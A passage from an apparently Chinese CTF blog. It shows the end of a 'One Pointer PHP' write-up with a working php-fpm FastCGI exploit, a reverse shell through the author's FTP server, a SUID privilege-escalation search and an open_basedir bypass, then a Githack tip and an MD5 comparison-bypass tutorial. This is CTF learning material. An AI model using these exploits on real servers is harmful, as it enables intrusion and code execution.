   $this->connect();</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$paramsRequest</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span>'<span class="token operator">?</span>file<span class="token operator">=</span>ftp<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//ip:9999/&amp;data='.urlencode($request));</span><span class="token comment" spellcheck="true">//        fwrite($this->_sock, $request);</span><span class="token comment" spellcheck="true">//        do {</span><span class="token comment" spellcheck="true">//            $resp = $this->readPacket();</span><span class="token comment" spellcheck="true">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {</span><span class="token comment" spellcheck="true">//                $response .= $resp['content'];</span><span class="token comment" spellcheck="true">//            }</span><span class="token comment" spellcheck="true">//        } while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span><span class="token comment" spellcheck="true">//        var_dump($resp);</span><span class="token comment" spellcheck="true">//        if (!is_array($resp)) {</span><span class="token comment" spellcheck="true">//            throw new Exception('Bad request');</span><span class="token comment" spellcheck="true">//        }</span><span class="token comment" spellcheck="true">//        switch (ord($resp['content']{4})) {</span><span class="token comment" spellcheck="true">//            case self::CANT_MPX_CONN:</span><span class="token comment" spellcheck="true">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span><span class="token comment" spellcheck="true">//                break;</span><span class="token comment" spellcheck="true">//            case self::OVERLOADED:</span><span class="token comment" spellcheck="true">//                throw new Exception('New request rejected; too busy [OVERLOADED]');</span><span class="token comment" spellcheck="true">//                break;</span><span class="token comment" spellcheck="true">//            case self::UNKNOWN_ROLE:</span><span class="token comment" spellcheck="true">//                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span><span class="token comment" spellcheck="true">//                break;</span><span class="token comment" spellcheck="true">//            case self::REQUEST_COMPLETE:</span><span class="token comment" spellcheck="true">//                return $response;</span><span class="token comment" spellcheck="true">//        }</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// real exploit start here</span><span class="token comment" spellcheck="true">//if (!isset($_REQUEST['cmd'])) {</span><span class="token comment" spellcheck="true">//    die("Check your input\n");</span><span class="token comment" spellcheck="true">//}</span><span class="token comment" spellcheck="true">//if (!isset($_REQUEST['filepath'])) {</span><span class="token comment" spellcheck="true">//    $filepath = __FILE__;</span><span class="token comment" spellcheck="true">//}else{</span><span class="token comment" spellcheck="true">//    $filepath = $_REQUEST['filepath'];</span><span class="token comment" spellcheck="true">//}</span> <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 文件路径</span><span class="token variable">$req</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$req</span> <span class="token punctuation">.</span><span class="token string">'?'</span><span class="token punctuation">.</span><span class="token string">'command=whoami'</span><span class="token punctuation">;</span><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">(</span>"unix<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///var/run/php-fpm.sock", -1);</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">"&lt;?php system(\$_REQUEST['command']); phpinfo(); ?>"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// php payload -- Doesnt do anything</span><span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token string">"unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = payload.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// extension_dir即为.so文件所在目录 放在tmp是因为普适性比较强，这里有/var/www/html的权限，所以放在这个目录</span><span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'GATEWAY_INTERFACE'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'FastCGI/1.0'</span><span class="token punctuation">,</span>    <span class="token string">'REQUEST_METHOD'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'POST'</span><span class="token punctuation">,</span>    <span class="token string">'SCRIPT_FILENAME'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$filepath</span><span class="token punctuation">,</span>    <span class="token string">'SCRIPT_NAME'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$req</span><span class="token punctuation">,</span>    <span class="token string">'QUERY_STRING'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'command=whoami'</span><span class="token punctuation">,</span>    <span class="token string">'REQUEST_URI'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$uri</span><span class="token punctuation">,</span>    <span class="token string">'DOCUMENT_URI'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$req</span><span class="token punctuation">,</span><span class="token shell-comment comment">#</span><span class="token string">'DOCUMENT_ROOT'</span>     <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'/'</span><span class="token punctuation">,</span>    <span class="token string">'PHP_VALUE'</span>         <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$php_value</span><span class="token punctuation">,</span>    <span class="token string">'SERVER_SOFTWARE'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'ctfking/Tajang'</span><span class="token punctuation">,</span>    <span class="token string">'REMOTE_ADDR'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string">'REMOTE_PORT'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'9001'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 找准服务端口</span>    <span class="token string">'SERVER_ADDR'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string">'SERVER_PORT'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'80'</span><span class="token punctuation">,</span>    <span class="token string">'SERVER_NAME'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>    <span class="token string">'SERVER_PROTOCOL'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'HTTP/1.1'</span><span class="token punctuation">,</span>    <span class="token string">'CONTENT_LENGTH'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// print_r($_REQUEST);</span><span class="token comment" spellcheck="true">// print_r($params);</span><span class="token comment" spellcheck="true">//echo "Call: $uri\n\n";</span><span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>访问后生成<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(17).png"><br>把ip改成自己的公网地址</p><p>开始一遍监听，一遍运行python脚本（FTP服务器）<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(18).png">再file.php输入参数：<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(19).png"><br>成功反弹shell<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(20).png">但是发现权限被限制了<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(21).png"><br>只能提权了：</p><pre class=" language-php"><code class="language-php">find <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">-</span>u<span class="token operator">=</span>s <span class="token operator">-</span>type f <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span></code></pre><p>提权大概要40s<br>等待一会输入：</p><pre class=" language-info"><code class="language-info">php -a  //进入php交互模式</code></pre><p>再次利用ini_set拿flag</p><pre class=" language-info"><code class="language-info">mkdir('qf');chdir('qf');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/flag'));</code></pre><p><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(22).png"><br>至此，结束了一切。</p><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>个人认为非常难，但是也挺偏向实战一点点，起码是一个很符合CTF的题目。主要的难点还是在理解那个php脚本的，要对应好监听的端口和php脚本里面的代码，其实这道题目用蚁剑的插件也可以做出来，不过要修改几个插件的代码。比较懒就不写了<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(23).png"><br>贴个图证明我真的试过了，要记得改端口，还要把插件里面的函数**fsockopen <strong>改为</strong> pfsockopen **<br>附上修改文件：</p><ul><li>\antData\plugins\as_bypass_php_disable_functions-master\payload.js</li><li><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(24).png"><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(25).png"></li><li>\antData\plugins\as_bypass_php_disable_functions-master\core\php_fpm\index.js</li><li><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(26).png"></li><li><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(27).png"></li></ul><p>如果是手工操作的话还是要记得对应好端口。<br>不过这个蚁剑最后这些文件是创建成功了，但是连接不上就有点尴尬了.可能是我版本和别人不一样改的也就不行了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Githack无法下载源码的问题</title>
      <link href="/2022/08/23/Githack%E6%97%A0%E6%B3%95%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2022/08/23/Githack%E6%97%A0%E6%B3%95%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>Githack有个好坑的地方<br />刚开始的时候总是下载不到泄露的<code>php文件</code><br />要扫很多次才有可能下载到,可是要是是真实环境,扫了两遍没有可能就真的觉得没有了,那如何解决呢？<br />于是我进了源码看一下<br /><img src="/Blogimages/1/1-1.png"><br />点击进入githack.py并编辑<br /><img src="/Blogimages/1/1-2.png"><br />把他线程改低一点就可以了,流量不够大就可以不被拒绝访问<br />就可以下载到源码</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MD5碰撞</title>
      <link href="/2022/04/02/MD5%E7%A2%B0%E6%92%9E/"/>
      <url>/2022/04/02/MD5%E7%A2%B0%E6%92%9E/</url>
      
        <content type="html"><![CDATA[<p><a name="lCJgX"></a></p><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>在CTF中可以说是经常碰到md5加密了，一般都是进行<code>强比较</code>抑或是<code>弱比较</code>，考法非常多，但是万变不离其中。只要我们掌握了原理，一切问题便迎刃而解了。<br><a name="NGMi1"></a></p><span id="more"></span><h2 id="简单了解MD5："><a href="#简单了解MD5：" class="headerlink" title="简单了解MD5："></a>简单了解MD5：</h2><ul><li>md5是一种加密算法，并且<code>不能防止碰撞破解</code>。</li><li>md5加密是不可逆的，这就意味着有<code>两串不同的字符串``加密出来的内容却是相同的</code></li><li>加密过程简单，碰撞还原字符难</li></ul><p><a name="rvOcf"></a></p><h2 id="PHP的弱比较："><a href="#PHP的弱比较：" class="headerlink" title="PHP的弱比较："></a>PHP的弱比较：</h2><p>先提两个例子：</p><pre class=" language-bash"><code class="language-bash">var_dump<span class="token punctuation">(</span><span class="token string">"123a"</span><span class="token operator">==</span>123<span class="token punctuation">)</span>var_dump<span class="token punctuation">(</span><span class="token string">"123a"</span><span class="token operator">==</span><span class="token string">"123"</span><span class="token punctuation">)</span></code></pre><p><strong><font color='#ff9900'>不看答案想一下结果会是什么</font></strong></p><p>在没有认真总结前，完全不知道弱比较还要区分<code>与**字符串**类型比较</code>还是<code>与int类型比较</code><br>上述实例的结果是：</p><pre class=" language-bash"><code class="language-bash">TrueFalse</code></pre><p><a name="C4062"></a></p><h3 id="字符串与int类型比较"><a href="#字符串与int类型比较" class="headerlink" title="字符串与int类型比较:"></a>字符串与int类型比较:</h3><p>PHP规定当进行<code>字符串与数字的弱比较时</code>，会<code>进行如下步骤</code>：<br>先看字符串开头是否为数字，如果为数字，则截止到连续数字的最后一个数字，即<code>&quot;123abc456&quot;</code>&#x3D;&gt;<code>123</code><br>如果开头不为数字，则判断为false，即0。因此<br><code>(&quot;aaa123&quot;==0)</code> &#x3D;&gt;<code>true</code><br><code>(&quot;123a&quot;==123)</code> &#x3D;&gt;<code>true</code><br><strong>思维导图：</strong><br><img src="/Blogimages/2/2-1.png" alt="1"><br><a name="ILEFW"></a></p><h3 id="字符串与字符串比较："><a href="#字符串与字符串比较：" class="headerlink" title="字符串与字符串比较："></a>字符串与字符串比较：</h3><p>正如上面所言：</p><pre class=" language-bash"><code class="language-bash">var_dump<span class="token punctuation">(</span><span class="token string">"123a"</span><span class="token operator">==</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //False</code></pre><p>因为这个是字符串之间进行比较，想要绕过这个弱比较只能用<code>0e</code>的方式。<br>在PHP中”0e”判断为科学计数法，<code>0e123就是0的10123次方</code><br>不难推出：<code>0e123456789==0e1</code> &#x2F;&#x2F; 因为0的任意次方都为0<br>不过有一个注意点：</p><pre class=" language-bash"><code class="language-bash"><span class="token string">"0e123456"</span><span class="token operator">==</span><span class="token string">"0e345"</span>  //True<span class="token string">"0e12adfc"</span><span class="token operator">==</span><span class="token string">"0e345"</span>  //False在0e后面不能含有字母！！！在0e后面不能含有字母！！！在0e后面不能含有字母！！<span class="token operator">!</span>否则判断为False</code></pre><p>#实例</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpif<span class="token punctuation">(</span><span class="token string">"0e23253"</span><span class="token operator">==</span><span class="token string">"0e2345"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'yes'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span></code></pre><p>输出：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">yes</span></code></pre><p><a name="eQQch"></a></p><h2 id="CTF的MD5弱比较"><a href="#CTF的MD5弱比较" class="headerlink" title="CTF的MD5弱比较"></a>CTF的MD5弱比较</h2><p>在CTF中，会遇到如下的MD5弱比较题目<br><a name="XWV4b"></a></p><h3 id="1-md5-a-md5-b-a-b"><a href="#1-md5-a-md5-b-a-b" class="headerlink" title="1.md5($a)&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b"></a>1.md5($a)&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token variable">$md5_1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5_1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$md5_2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5_1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5_2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token variable">$md5_1</span> <span class="token operator">!=</span> <span class="token variable">$md5_2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"try harder"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>这个时候就要利用<code>0e</code>的形式来解题，找到两个不同字符，md5加密后却都是0e324234的形式。如何寻找这样的字符串？<br>1.脚本寻找</p><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment"># -*- coding: utf-8 -*-</span>import multiprocessingimport hashlibimport randomimport stringimport sys<span class="token constant">CHARS</span> <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsdef <span class="token function">cmp_md5</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> <span class="token constant">CHARS</span>    <span class="token keyword">while</span> not stop_event<span class="token punctuation">.</span><span class="token function">is_set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rnds <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">choice</span><span class="token punctuation">(</span><span class="token constant">CHARS</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ in <span class="token function">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>        md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span>rnds<span class="token punctuation">)</span>        value <span class="token operator">=</span> md5<span class="token punctuation">.</span><span class="token function">hexdigest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> value<span class="token punctuation">[</span>start<span class="token punctuation">:</span> start <span class="token operator">+</span> str_len<span class="token punctuation">]</span> <span class="token operator">==</span> substr<span class="token punctuation">:</span>            <span class="token shell-comment comment"># print rnds</span>            <span class="token shell-comment comment"># stop_event.set()</span>            <span class="token shell-comment comment"># 碰撞双md5</span>            md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>            <span class="token keyword">if</span> md5<span class="token punctuation">.</span><span class="token function">hexdigest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>start<span class="token punctuation">:</span> start <span class="token operator">+</span> str_len<span class="token punctuation">]</span> <span class="token operator">==</span> substr<span class="token punctuation">:</span>                <span class="token keyword">print</span> rnds <span class="token operator">+</span> <span class="token string">"=>"</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string">"=>"</span> <span class="token operator">+</span> md5<span class="token punctuation">.</span><span class="token function">hexdigest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>                stop_event<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    substr <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">strip</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    start_pos <span class="token operator">=</span> <span class="token function">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span>    str_len <span class="token operator">=</span> <span class="token function">len</span><span class="token punctuation">(</span>substr<span class="token punctuation">)</span>    cpus <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span><span class="token function">cpu_count</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    stop_event <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span><span class="token function">Event</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    processes <span class="token operator">=</span> <span class="token punctuation">[</span>multiprocessing<span class="token punctuation">.</span><span class="token function">Process</span><span class="token punctuation">(</span>target<span class="token operator">=</span>cmp_md5<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span>                                                               stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start_pos<span class="token punctuation">)</span><span class="token punctuation">)</span>                 <span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span>cpus<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> p in processes<span class="token punctuation">:</span>        p<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> p in processes<span class="token punctuation">:</span>        p<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>用法：</p><pre class=" language-bash"><code class="language-bash">输入命令python md5.py <span class="token string">"0e"</span> 0<span class="token string">"0e"</span> <span class="token operator">=</span><span class="token operator">></span>要跑的字符 0   <span class="token operator">=</span><span class="token operator">></span>要跑的字符的起始位置</code></pre><p><img src="/Blogimages/2/2-2.png"><br>脚本寻找要浪费大概十分钟左右的时间才能找出一个，可以用网上现成的，如果题目要求比较特殊的话，再利用自己的脚本跑<br>2.百度</p><table><thead><tr><th>MMHUWUV        0e701732711630150438129209816536</th></tr></thead><tbody><tr><td>MAUXXQC       0e478478466848439040434801845361</td></tr><tr><td>IHKFRNS        0e256160682445802696926137988570</td></tr><tr><td>GZECLQZ        0e537612333747236407713628225676</td></tr><tr><td>GGHMVOE        0e362766013028313274586933780773</td></tr><tr><td>GEGHBXL        0e248776895502908863709684713578</td></tr><tr><td>EEIZDOI        0e782601363539291779881938479162</td></tr><tr><td>DYAXWCA        0e424759758842488633464374063001</td></tr></tbody></table><p><img src="/Blogimages/2/2-3.png"><br>这样子就出flag了<br><a name="ArvDI"></a></p><h3 id="2-a-md5-a"><a href="#2-a-md5-a" class="headerlink" title="2.$a&#x3D;&#x3D;md5($a)"></a>2.$a&#x3D;&#x3D;md5($a)</h3><p>这一类题型要求满足$a是0e开头，且加密后也是0e开头<br>在网上收集了这些结果：</p><table><thead><tr><th>0e215962017    0e291242476940776845150308577824</th></tr></thead><tbody><tr><td>0e1284838308       0e708279691820928818722257405159</td></tr><tr><td>0e1137126905       0e291659922323405260514745084877</td></tr><tr><td>0e807097110       0e318093639164485566453180786895</td></tr><tr><td>0e730083352      0e870635875304277170259950255928</td></tr></tbody></table><p>弱比较主要就是以上两种类型。<br><a name="UILG2"></a></p><h2 id="CTF的MD5强比较"><a href="#CTF的MD5强比较" class="headerlink" title="CTF的MD5强比较"></a>CTF的MD5强比较</h2><p><a name="X5Dcp"></a></p><h3 id="1-md5-a-md5-b-a-b-1"><a href="#1-md5-a-md5-b-a-b-1" class="headerlink" title="1.md5($a)&#x3D;&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b"></a>1.md5($a)&#x3D;&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b</h3><p><a name="Ajb8Q"></a></p><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>数组绕过</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token variable">$md5_1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5_1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$md5_2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5_1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5_2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token variable">$md5_1</span> <span class="token operator">!=</span> <span class="token variable">$md5_2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"try harder"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><code>md5_1[]=1&amp;md5_2[]=2</code><br>因为PHP对无法md5加密的东西不加密，结果为NULL，虽然会报错，但是null&#x3D;null，逻辑关系为True。所以可以输出flag<br><img src="/Blogimages/2/2-4.png"><br><a 